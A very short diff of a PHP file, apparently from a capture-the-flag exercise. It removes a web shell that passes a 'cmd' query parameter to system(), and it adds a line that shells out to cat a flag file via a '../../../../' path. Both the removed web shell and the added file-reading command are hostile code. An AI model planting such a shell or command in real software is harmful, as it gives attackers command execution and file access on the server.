@@ -1,5 +1,3 @@
 <?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
+    system('cat ../../../../var/www/flag.txt');
 ?>
